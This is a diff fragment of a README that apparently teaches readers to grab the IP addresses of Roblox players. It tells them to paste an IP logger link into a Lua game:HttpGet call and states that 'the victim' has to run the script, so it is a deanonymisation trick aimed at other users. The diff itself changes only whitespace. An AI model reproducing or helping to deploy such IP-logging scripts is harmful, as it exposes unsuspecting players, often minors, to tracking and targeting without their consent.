@@ -20,7 +20,7 @@ I would reccomend using this site. https://www.base64encode.org/
 # How to use it on ROBLOX
 Step 1: Complete the tutorial above on getting an IP logger link, unless you have your own site.  
 Step 2: Put the link of the IP logger in between the qoutations. Exploits is for a script that will only work on  
-**Note: The victim will need to execute these scripts. Executing this yourself will only get your own IP.**
+**Note: The victim will need to execute these scripts. Executing this yourself will only get your own IP.**  
 **[Exploits]**  
 ```lua
 game:HttpGet("Site Here")
